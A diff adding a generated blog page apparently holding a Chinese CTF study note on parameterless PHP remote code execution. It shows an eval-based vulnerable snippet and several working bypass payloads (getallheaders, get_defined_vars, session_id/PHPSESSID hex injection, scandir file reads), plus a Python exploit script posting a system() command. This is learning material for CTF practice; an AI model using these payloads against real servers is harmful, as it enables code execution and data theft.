@@ -1,0 +1,145 @@
+<!doctype html>
+<head>
+  <meta charset="utf-8">
+  <meta name="description" content="&lt;h2 id=&#34;题目&#34;&gt;&lt;a href=&#34;#题目&#34; class=&#34;headerlink&#34; title=&#34;题目&#34;&gt;&lt;/a&gt;题目&lt;/h2&gt;&lt;h3 id=&#34;GXYCTF2019—禁止套娃&#34;&gt;&lt;a href=&#34;#GXYCTF2019—禁止套娃&#34; class=&#34;headerlink&#34; title=&#34;GXYCTF2019—禁止套娃&#34;&gt;&lt;/a&gt;GXYCTF2019—禁止套娃&lt;/h3&gt;&lt;h3 id=&#34;极客大挑战-">
+  <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, user-scalable=yes">
+  <title>PHP无参数RCE | powercat</title>
+
+  <link rel="stylesheet" id="chosen-theme" href="https://rawgit.com/fiatjaf/classless/master/themes/plain/theme.css">
+  <script>
+let link = document.getElementById('chosen-theme')
+let widget = document.createElement('div')
+widget.style.position = 'absolute'
+widget.style.right = '5px'
+widget.style.top = '2px'
+widget.style.background = 'beige'
+widget.style.color = '#444'
+widget.style.zIndex = 99
+widget.style.padding = '4px 8px'
+widget.innerHTML = `
+<label>
+  <p>No theme was set on <code>theme_config</code>.<br>
+     Choose a theme from the list to experiment with it:</p>
+  <select></select>
+</label>
+`
+fetch('https://api.github.com/repos/fiatjaf/classless/contents/themes')
+  .then(r => r.json())
+  .then(files => {
+    document.body.appendChild(widget)
+    let select = document.querySelector('select')
+    files
+      .filter(f => f.type === 'dir')
+      .forEach(f => {
+        let option = document.createElement('option')
+        option.value = f.name
+        option.innerHTML = f.name
+        select.appendChild(option)
+      })
+    let options = Array.from(select.querySelectorAll('option'))
+    let chosen = options[parseInt(Math.random() * options.length)]
+    chosen.selected = true
+    link.href = link.href.replace(/themes\/[^\/]+/, `themes/${chosen.value}`)
+    select.addEventListener('change', e => {
+      let chosen = e.target.value
+      link.href = link.href.replace(/themes\/[^\/]+/, `themes/${chosen}`)
+    })
+  })
+  .catch(console.log)
+  </script>
+
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body>
+  <header role="banner">
+      <a href="/">
+        
+          <img src="https://picsum.photos/640/480">
+        
+      </a>  
+    <h1>
+      <a href="/">powercat</a>
+    </h1>
+    <aside>
+      <p></p>
+    </aside>
+  </header>
+  
+  <main>
+    <article>
+  <header>
+  
+  <h1><a href="http://example.com/2021/11/10/PHP%E6%97%A0%E5%8F%82%E6%95%B0RCE/">PHP无参数RCE</a></h1>
+  <aside>
+    
+    <time datetime="212021-11-10">
+      November 10th 2021
+    </time>
+    
+    <ul>
+    
+      <li><a href="/tags/study/">study</a></li>
+    
+    </ul>
+  </aside>
+</header>
+
+  <div><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="GXYCTF2019—禁止套娃"><a href="#GXYCTF2019—禁止套娃" class="headerlink" title="GXYCTF2019—禁止套娃"></a>GXYCTF2019—禁止套娃</h3><h3 id="极客大挑战-2020-Roamphp4-Rceme"><a href="#极客大挑战-2020-Roamphp4-Rceme" class="headerlink" title="[极客大挑战 2020]Roamphp4-Rceme"></a>[极客大挑战 2020]Roamphp4-Rceme</h3><p>限制条件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/[^\W]+\((?R)?\)/</span><br><span class="line">(?R)引用当前表达式，?递归调用</span><br><span class="line">或</span><br><span class="line">/[^\s\(\)]+?\((?R)?\)/</span><br></pre></td></tr></table></figure>
+
+<p>以上表达式匹配这种格式的。<img src="https://xzfile.aliyuncs.com/media/upload/picture/20210325204736-46bca358-8d68-1.png" alt="img"></p>
+<p>也就是我们需要使用无参数的rce</p>
+<h2 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//index.php</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210325204737-470b348c-8d68-1.png" alt="img"></p>
+<p>目录中下的文件</p>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><h3 id="payload-1-getenv"><a href="#payload-1-getenv" class="headerlink" title="payload_1 getenv()"></a>payload_1 getenv()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(getenv(phpinfo()));</span><br></pre></td></tr></table></figure>
+
+<p>getenv()获取一个环境变量的值，phpinfo()获取全部的环境变量，不是很好理解，直接用phpinfo()就好了。</p>
+<h3 id="payload-2-getallheaders"><a href="#payload-2-getallheaders" class="headerlink" title="payload_2 getallheaders()"></a>payload_2 getallheaders()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(end(getallheaders()));</span><br></pre></td></tr></table></figure>
+
+<p>end()将数组的内部指针移到最后一个；</p>
+<p>getallheaders()获取所有的http请求头；</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210325204737-472bea42-8d68-1.png" alt="img"></p>
+<p>这里需要两个eval的原因，我认为是。如果只有一个eval就只是执行end(getallheaders());获取了其返回值，但是并没有执行其返回值，再加一个eval，也就是获取了返回值后，再eval()。</p>
+<p>如果用bp打，传最后一个似乎并不行，那么我们可以尝试修改ua头，然后用end改成next；</p>
+<h3 id="payload-3-get-defined-vars"><a href="#payload-3-get-defined-vars" class="headerlink" title="payload_3 get_defined_vars()"></a>payload_3 get_defined_vars()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eval(end(current(get_defined_vars())));&amp;jiang=phpinfo();</span><br></pre></td></tr></table></figure>
+
+<p>get_defined_var()返回由所有已定义变量所组成的数组，会返回$_GET,$_POST,$_cookie,$_FILES全局变量的值，返回数组顺序为get-&gt;post-&gt;cookies-&gt;files</p>
+<p>current()返回数组中的当前单元，初始指向插入到数组中的第一个单元，也就是会返回$_GET变量的数组值。</p>
+<p>如果需要post就把current改为next就好。</p>
+<p>而如果网站对get、post、cookie都做的过滤，那我们只能从files入手了，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params">payload</span>):</span><br><span class="line">  txt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">      txt += <span class="built_in">hex</span>(<span class="built_in">ord</span>(i))[-<span class="number">2</span>:]</span><br><span class="line">  <span class="keyword">return</span> txt</span><br><span class="line">payload = str2hex(<span class="string">&quot;system(&#x27;cat flag.php&#x27;);&quot;</span>)</span><br><span class="line">files = &#123;</span><br><span class="line">    payload: <span class="string">b&#x27;extrader&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">r = requests.post(<span class="string">&quot;http://192.168.0.107/index.php?exp=eval(hex2bin(array_rand(end(get_defined_vars()))));&quot;</span>, files=files, allow_redirects=<span class="literal">False</span>)  <span class="comment"># allow_redirects=False 禁用重定向处理</span></span><br><span class="line"><span class="built_in">print</span>(r.content.decode())</span><br></pre></td></tr></table></figure>
+
+<p><strong>array_rand()：</strong>从数组中随机取出一个或多个单元，如果只取出一个，**<code>array_rand()</code>**返回随机单元的键名。 否则就返回包含随机键名的数组。</p>
+<h3 id="payload-4-session-start"><a href="#payload-4-session-start" class="headerlink" title="payload_4  session_start()"></a>payload_4  session_start()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())))</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>()));</span><br><span class="line"><span class="title function_ invoke__">readfile</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())); 或者<span class="title function_ invoke__">readgzfile</span>();</span><br><span class="line">修改cookie : PHPSESSID= filename</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">session_id</span>(<span class="title function_ invoke__">session_start</span>())));</span><br><span class="line">抓包传入Cookie: PHPSESSID=(<span class="string">&quot;system(&#x27;命令&#x27;)&quot;</span>的十六进制)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20210325204738-478af10e-8d68-1.png" alt="img"></p>
+<h3 id="payload-5-scandir"><a href="#payload-5-scandir" class="headerlink" title="payload_5-scandir()"></a>payload_5-scandir()</h3><p>读取文件</p>
+<p>读取文件有好多操作，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当前目录：highlight_file(array_rand(array_flip(scandir(getcwd()))));</span><br><span class="line">上级目录文件：highlight_file(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</span><br><span class="line">以上两个都是随机获取的其实，看脸。</span><br></pre></td></tr></table></figure>
+
+<p>可以配合 数组的指针，倒序，等各种方式找到我们的文件。</p>
+<ul>
+<li>**getcwd()**：取得当前工作目录，成功则返回当前工作目录，失败返回 **<code>FALSE</code>**。</li>
+<li>**dirname()*<em>：返回路径中的目录部分，返回 path 的父目录。 如果在 <code>path</code> 中没有斜线，则返回一个点（’</em>.*‘），表示当前目录。否则返回的是把 <code>path</code> 中结尾的 <code>/component</code>（最后一个斜线以及后面部分）去掉之后的字符串(也就是上级目录的文件路径)。</li>
+<li>**chdir()**：改变目录，成功时返回 **<code>TRUE</code>**， 或者在失败时返回 **<code>FALSE</code>**。</li>
+<li>**scandir()**：列出指定路径中的文件和目录。成功则返回包含有文件名的数组，如果失败则返回 **<code>FALSE</code>**。如果 <code>directory</code> 不是个目录，则返回布尔值 <strong><code>FALSE</code></strong> 并生成一条 <strong><code>E_WARNING</code></strong> 级的错误。</li>
+<li>**array_flip()**：交换数组中的键和值，成功时返回交换后的数组，如果失败返回 **<code>NULL</code>**。</li>
+<li><strong>array_rand()<strong>：从数组中随机取出一个或多个单元，如果只取出一个(默认为1)，</strong>array_rand()</strong> 返回随机单元的键名。 否则就返回包含随机键名的数组。 完成后，就可以根据随机的键获取数组的随机值。</li>
+</ul>
+</div>
+</article>
+
+  </main>
+  <aside>
+    <p>This is an `aside`, a useful place to put information of any kind: metadata about the site author (with or without pictures), brief information about the purposes of the site, a static collection of external links or anything else.</p>
+<p>For some Classless themes pictures and data about the author may suit better in the `cover` and `description` site attributes (see `config.toml`), but most of the times that kind of information will fit here better.</p>
+
+  </aside>
+  <footer role="contentinfo">
+    <p>A default site footer. If you don't know what to place here maybe you should just write your name plus the current year?</p>
+<p>If you want to have a sitemap, a contact form or other complex stuff, most Classless themes will also handle it nicely. Or you can take a look at the <code>aside.html</code> partial.</p>
+
+  </footer>
+</body>
